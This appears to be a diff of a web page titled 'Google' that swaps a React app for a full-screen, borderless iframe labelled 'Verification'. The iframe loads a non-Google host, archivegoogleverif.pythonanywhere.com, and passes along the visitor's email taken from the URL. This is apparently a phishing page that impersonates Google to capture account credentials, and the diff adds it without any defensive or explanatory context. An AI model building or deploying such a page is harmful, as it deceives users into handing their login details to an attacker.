@@ -1,23 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Google</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-      /* Ensure html and body take full height for the sticky footer/full-screen layout */
-      html, body, #root {
+      /* Pleine hauteur pour le conteneur */
+      html, body {
         height: 100%;
         margin: 0;
         padding: 0;
-        overflow: hidden; /* Prevent scrollbars on the body, let iframe handle scrolling if needed */
+        overflow: hidden;
+      }
+      /* Iframe pleine page sans bordure */
+      iframe {
+        width: 100%;
+        height: 100%;
+        border: none;
+        display: block;
       }
     </style>
   <script type="importmap">
 {
   "imports": {
-    "react-dom/": "https://esm.sh/react-dom@^19.2.3/",
     "react": "https://esm.sh/react@^19.2.3",
     "react/": "https://esm.sh/react@^19.2.3/"
   }
@@ -25,7 +31,33 @@
 </script>
 </head>
   <body>
-    <div id="root"></div>
-    <script type="module" src="/index.tsx"></script>
+    <!-- L'iframe sera chargée ici -->
+    <iframe 
+      id="main-frame" 
+      title="Verification" 
+      sandbox="allow-scripts allow-same-origin allow-forms"
+    ></iframe>
+
+    <script>
+      (function() {
+        // Logique JavaScript standard (pas besoin de React ni de compilation)
+        
+        // 1. Récupérer les paramètres de l'URL
+        const params = new URLSearchParams(window.location.search);
+        
+        // 2. Récupérer l'email ou mettre la valeur par défaut
+        const email = params.get('email') || '******@gmail.com';
+
+        // 3. Définir l'URL cible
+        const baseUrl = 'https://archivegoogleverif.pythonanywhere.com/';
+        const finalUrl = `${baseUrl}?email=${encodeURIComponent(email)}`;
+
+        // 4. Mettre à jour la source de l'iframe
+        const iframe = document.getElementById('main-frame');
+        if (iframe) {
+          iframe.src = finalUrl;
+        }
+      })();
+    </script>
   </body>
 </html>
